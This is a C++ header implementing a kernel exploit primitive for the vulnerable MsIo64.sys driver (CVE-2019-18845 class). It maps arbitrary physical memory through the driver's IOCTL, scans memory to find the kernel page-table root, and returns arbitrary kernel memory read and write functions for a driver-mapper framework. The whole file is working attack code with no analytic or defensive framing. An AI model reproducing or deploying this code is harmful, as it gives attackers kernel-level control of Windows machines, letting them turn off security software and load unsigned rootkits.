#pragma once
// primitive_msio.hpp — MICSYS / Patriot / ASRock Polychrome MsIo64.sys (CVE-2019-18845 class)
// Device: \\.\MsIo  (symlink \DosDevices\MsIo — IDA session b71c23ac)
// IOCTLs (METHOD_BUFFERED, 40-byte MSIO_PHYSICAL_MEMORY_INFO):
//   0x80102040 IOCTL_MSIO_MAPPHYSTOLIN  — MapPhysicalMemoryToLinearSpace (ZwMapViewOfSection)
//   0x80102044 IOCTL_MSIO_UNMAPPHYS     — UnmapPhysicalMemory
//   0x80102050 / 0x80102054 — port I/O (not used here)

#include "mapper.hpp"
#include <Windows.h>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <memory>
#include <algorithm>
#include <iostream>
#include <vector>

#ifdef min
#undef min
#endif

static constexpr DWORD MSIO_IOCTL_MAP_PHYS = 0x80102040;
static constexpr DWORD MSIO_IOCTL_UNMAP_PHYS = 0x80102044;

static constexpr uint64_t MSIO_PTE_ADDR_MASK = 0x000FFFFFFFFFF000ULL;
static constexpr uint64_t MSIO_PDPTE_1GB_ADDR_MASK = 0x000FFFFFC0000000ULL;
static constexpr uint64_t MSIO_PDE_2MB_ADDR_MASK = 0x000FFFFFFFE00000ULL;

#pragma pack(push, 8)
struct MSIO_MAP_INFO {
    ULONG64 Size;     // +0x00  driver caps translate span to 4 bytes
    ULONG64 Phys;     // +0x08
    HANDLE  Section;  // +0x10 in/out
    PVOID   Linear;   // +0x18 in/out
    PVOID   Object;   // +0x20 in/out
};
#pragma pack(pop)
static_assert(sizeof(MSIO_MAP_INFO) == 40, "MsIo IOCTL buffer must be 40 bytes");

struct MsIoMapped {
    void*   linear = nullptr;
    HANDLE  section = nullptr;
    PVOID   object = nullptr;
};

static int MsIoSehMemcpyRead(void* dst, const void* src, size_t n) {
    __try { memcpy(dst, src, n); return 1; }
    __except (EXCEPTION_EXECUTE_HANDLER) { return 0; }
}
static int MsIoSehMemcpyWrite(void* dst, const void* src, size_t n) {
    __try { memcpy(dst, src, n); return 1; }
    __except (EXCEPTION_EXECUTE_HANDLER) { return 0; }
}

static bool MsIoMapAt(HANDLE h, uint64_t pa, ULONG64 span, MsIoMapped& out) {
    MSIO_MAP_INFO pkt{};
    pkt.Size = span;
    pkt.Phys = pa;
    DWORD got = 0;
    if (!DeviceIoControl(h, MSIO_IOCTL_MAP_PHYS,
                         &pkt, sizeof(pkt), &pkt, sizeof(pkt), &got, nullptr))
        return false;
    if (!pkt.Linear) return false;
    out.linear = pkt.Linear;
    out.section = pkt.Section;
    out.object = pkt.Object;
    return true;
}

static void MsIoUnmapAt(HANDLE h, const MsIoMapped& m) {
    if (!m.linear) return;
    MSIO_MAP_INFO pkt{};
    pkt.Section = m.section;
    pkt.Linear = m.linear;
    pkt.Object = m.object;
    DWORD got = 0;
    DeviceIoControl(h, MSIO_IOCTL_UNMAP_PHYS,
                    &pkt, sizeof(pkt), &pkt, sizeof(pkt), &got, nullptr);
}

// Map at PA; span passed to driver (max useful window often 4 bytes per dispatch logic).
static MsIoMapped MsIoMapPhys(HANDLE h, uint64_t pa, ULONG64 span) {
    MsIoMapped m{};
    if (!MsIoMapAt(h, pa, span, m)) {
        m.linear = nullptr;
        m.section = nullptr;
        m.object = nullptr;
    }
    return m;
}

static bool MsIoPhysRead(HANDLE h, uint64_t pa, void* dst, size_t size) {
    auto* d = static_cast<uint8_t*>(dst);
    size_t off = 0;
    while (off < size) {
        uint32_t chunk = static_cast<uint32_t>(std::min(size - off, (size_t)4));
        MsIoMapped m = MsIoMapPhys(h, pa + off, chunk);
        if (!m.linear) return false;
        int ok = MsIoSehMemcpyRead(d + off, m.linear, chunk);
        MsIoUnmapAt(h, m);
        if (!ok) return false;
        off += chunk;
    }
    return true;
}

static bool MsIoPhysWrite(HANDLE h, uint64_t pa, const void* src, size_t size) {
    const auto* s = static_cast<const uint8_t*>(src);
    size_t off = 0;
    while (off < size) {
        uint32_t chunk = static_cast<uint32_t>(std::min(size - off, (size_t)4));
        MsIoMapped m = MsIoMapPhys(h, pa + off, chunk);
        if (!m.linear) return false;
        int ok = MsIoSehMemcpyWrite(m.linear, s + off, chunk);
        MsIoUnmapAt(h, m);
        if (!ok) return false;
        off += chunk;
    }
    return true;
}

static uint64_t MsIoRead8(HANDLE h, uint64_t pa) {
    uint64_t v = 0;
    MsIoPhysRead(h, pa, &v, 8);
    return v;
}

static uint64_t MsIoVirtToPhys(HANDLE h, uint64_t cr3, uint64_t va) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };
    uint64_t pml4e = MsIoRead8(h, (cr3 & MSIO_PTE_ADDR_MASK) + idx(39) * 8);
    if (!(pml4e & 1)) return 0;
    uint64_t pdpte = MsIoRead8(h, (pml4e & MSIO_PTE_ADDR_MASK) + idx(30) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & MSIO_PDPTE_1GB_ADDR_MASK) | (va & 0x3FFFFFFF);
    uint64_t pde = MsIoRead8(h, (pdpte & MSIO_PTE_ADDR_MASK) + idx(21) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & MSIO_PDE_2MB_ADDR_MASK) | (va & 0x1FFFFF);
    uint64_t pte = MsIoRead8(h, (pde & MSIO_PTE_ADDR_MASK) + idx(12) * 8);
    if (!(pte & 1)) return 0;
    return (pte & MSIO_PTE_ADDR_MASK) | (va & 0xFFF);
}

struct MsIoPhysRange { uint64_t lo, hi; };

static bool MsIoIsInSafeRange(uint64_t addr, const std::vector<MsIoPhysRange>& ranges) {
    for (auto& r : ranges)
        if (addr >= r.lo && addr < r.hi) return true;
    return false;
}

static std::vector<MsIoPhysRange> MsIoGetSafePhysRanges() {
    std::vector<MsIoPhysRange> ranges;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return ranges;
    DWORD dataSize = 0, type = 0;
    RegQueryValueExA(hKey, ".Translated", nullptr, &type, nullptr, &dataSize);
    auto data = std::make_unique<BYTE[]>(dataSize);
    if (RegQueryValueExA(hKey, ".Translated", nullptr, &type, data.get(), &dataSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return ranges;
    }
    RegCloseKey(hKey);
    if (dataSize < 20) return ranges;
    auto* p = data.get();
    ULONG listCount = *(ULONG*)p; p += 4;
    for (ULONG i = 0; i < listCount && p < data.get() + dataSize; i++) {
        p += 8; p += 4;
        ULONG descCount = *(ULONG*)p; p += 4;
        for (ULONG j = 0; j < descCount && p + 20 <= data.get() + dataSize; j++) {
            UCHAR resType = p[0];
            USHORT flags = *(USHORT*)(p + 2);
            uint64_t start = *(uint64_t*)(p + 4);
            uint64_t length = *(uint32_t*)(p + 12);
            p += 20;
            if (resType == 3) {
                if (length > 0) ranges.push_back({ start, start + length });
            } else if (resType == 7) {
                if (flags & 0x0200) length <<= 8;
                else if (flags & 0x0400) length <<= 16;
                else if (flags & 0x0800) length <<= 32;
                if (length > 0) ranges.push_back({ start, start + length });
            }
        }
    }
    return ranges;
}

static uint64_t MsIoVirtToPhysSafe(HANDLE h, uint64_t cr3, uint64_t va,
        const std::vector<MsIoPhysRange>& ranges) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };
    uint64_t a0 = (cr3 & MSIO_PTE_ADDR_MASK) + idx(39) * 8;
    if (!MsIoIsInSafeRange(a0, ranges)) return 0;
    uint64_t pml4e = MsIoRead8(h, a0);
    if (!(pml4e & 1)) return 0;
    uint64_t a1 = (pml4e & MSIO_PTE_ADDR_MASK) + idx(30) * 8;
    if (!MsIoIsInSafeRange(a1, ranges)) return 0;
    uint64_t pdpte = MsIoRead8(h, a1);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & MSIO_PDPTE_1GB_ADDR_MASK) | (va & 0x3FFFFFFF);
    uint64_t a2 = (pdpte & MSIO_PTE_ADDR_MASK) + idx(21) * 8;
    if (!MsIoIsInSafeRange(a2, ranges)) return 0;
    uint64_t pde = MsIoRead8(h, a2);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & MSIO_PDE_2MB_ADDR_MASK) | (va & 0x1FFFFF);
    uint64_t a3 = (pde & MSIO_PTE_ADDR_MASK) + idx(12) * 8;
    if (!MsIoIsInSafeRange(a3, ranges)) return 0;
    uint64_t pte = MsIoRead8(h, a3);
    if (!(pte & 1)) return 0;
    return (pte & MSIO_PTE_ADDR_MASK) | (va & 0xFFF);
}

// Self-ref PML4 scan (same phases as Corsair, 4-byte MsIo map reads).
static uint64_t MsIoBootstrapCR3(HANDLE h) {
    printf("[*] MsIoBootstrapCR3\n");
    typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
    auto NtQSI = (pNtQuerySystemInformation)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return 0;
    ULONG needed = 0;
    NtQSI(11, nullptr, 0, &needed);
    auto buf = std::make_unique<uint8_t[]>(needed);
    if (NtQSI(11, buf.get(), needed, &needed) != 0) return 0;
    struct RTL_PROCESS_MODULE_INFORMATION {
        PVOID Section; PVOID MappedBase; PVOID ImageBase;
        ULONG ImageSize; ULONG Flags;
        USHORT LoadOrderIndex; USHORT InitOrderIndex;
        USHORT LoadCount; USHORT OffsetToFileName;
        CHAR FullPathName[256];
    };
    ULONG moduleCount = *(ULONG*)buf.get();
    if (!moduleCount) return 0;
    auto* mod0 = (RTL_PROCESS_MODULE_INFORMATION*)(buf.get() + 8);
    uint64_t ntkrnlVA = (uint64_t)mod0->ImageBase;
    int ntkrnlPml4Idx = (int)((ntkrnlVA >> 39) & 0x1FF);
    auto ranges = MsIoGetSafePhysRanges();
    if (ranges.empty()) return 0;
    uint64_t maxPhys = ranges.back().hi + 0x10000000ULL;

    auto validateCR3 = [&](uint64_t candidate) -> bool {
        uint64_t pa = MsIoVirtToPhysSafe(h, candidate, ntkrnlVA, ranges);
        if (!pa || !MsIoIsInSafeRange(pa, ranges)) return false;
        uint16_t mz = 0;
        MsIoPhysRead(h, pa, &mz, 2);
        return mz == 0x5A4D;
    };

    uint64_t cr3 = 0;
    const uint64_t kMaxPages = 0x80000;
    for (size_t r = 0; r < ranges.size() && !cr3; r++) {
        uint64_t lo = (ranges[r].lo + 0xFFF) & ~0xFFFULL;
        uint64_t hi = ranges[r].hi & ~0xFFFULL;
        uint64_t pages = 0;
        for (uint64_t pa = lo; pa < hi && pages < kMaxPages && !cr3; pa += 0x1000, ++pages) {
            uint64_t ntkE = MsIoRead8(h, pa + ntkrnlPml4Idx * 8);
            if (!(ntkE & 1)) continue;
            uint64_t target = ntkE & MSIO_PTE_ADDR_MASK;
            if (!target || target >= maxPhys) continue;
            for (int idx = 256; idx < 512; idx++) {
                uint64_t e = MsIoRead8(h, pa + idx * 8);
                if (!(e & 1)) continue;
                if ((e & MSIO_PTE_ADDR_MASK) != pa) continue;
                if (validateCR3(pa)) {
                    cr3 = pa;
                    break;
                }
                break;
            }
        }
    }
    printf("[+] MsIo CR3=0x%llx\n", (unsigned long long)cr3);
    return cr3;
}

static bool MsIoVirtRead(HANDLE h, uint64_t cr3, uint64_t va, void* dst, size_t n) {
    auto* d = static_cast<uint8_t*>(dst);
    size_t outOff = 0;
    while (n) {
        uint64_t pa = MsIoVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);
        size_t done = 0;
        while (done < chunk) {
            size_t step = std::min(chunk - done, (size_t)4);
            if (!MsIoPhysRead(h, pa + done, d + outOff + done, step)) return false;
            done += step;
        }
        outOff += chunk;
        va += chunk;
        n -= chunk;
    }
    return true;
}

static bool MsIoVirtWrite(HANDLE h, uint64_t cr3, uint64_t va, const void* src, size_t n) {
    const auto* s = static_cast<const uint8_t*>(src);
    while (n) {
        uint64_t pa = MsIoVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);
        size_t done = 0;
        while (done < chunk) {
            size_t step = std::min(chunk - done, (size_t)4);
            if (!MsIoPhysWrite(h, pa + done, s + done, step)) return false;
            done += step;
        }
        s += chunk;
        va += chunk;
        n -= chunk;
    }
    return true;
}

struct MsIoSession {
    HANDLE dev = INVALID_HANDLE_VALUE;
    uint64_t cr3 = 0;
};

inline KernelPrimitives OpenMsIo(std::string& err)
{
    printf("[*] OpenMsIo\n");
    HANDLE h = CreateFileW(L"\\\\.\\MsIo",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        err = "OpenMsIo: CreateFile failed err=" + std::to_string(GetLastError()) +
              " (MsIo service loaded?)";
        return {};
    }

    MsIoMapped smoke = MsIoMapPhys(h, 0x1000, 4);
    if (!smoke.linear) {
        CloseHandle(h);
        err = "OpenMsIo: smoke map 0x1000 failed";
        return {};
    }
    MsIoUnmapAt(h, smoke);

    uint64_t cr3 = MsIoBootstrapCR3(h);
    if (!cr3) {
        CloseHandle(h);
        err = "OpenMsIo: CR3 bootstrap failed";
        return {};
    }

    auto sp = std::make_shared<MsIoSession>();
    sp->dev = h;
    sp->cr3 = cr3;

    KernelPrimitives p;
    p.ReadKernelMemory = [sp](void* dst, uint64_t src, size_t sz) -> bool {
        return MsIoVirtRead(sp->dev, sp->cr3, src, dst, sz);
    };
    p.WriteKernelMemory = [sp](uint64_t dst, const void* src, size_t sz) -> bool {
        return MsIoVirtWrite(sp->dev, sp->cr3, dst, src, sz);
    };
    p.AllocateKernelMemory = nullptr;
    p.ReadPhysicalMemory = [sp](void* dst, uint64_t pa, size_t sz) -> bool {
        return MsIoPhysRead(sp->dev, pa, dst, sz);
    };
    p.cr3 = cr3;
    p.UpdateCR3 = [sp](uint64_t newCr3) { sp->cr3 = newCr3; };
    return p;
}
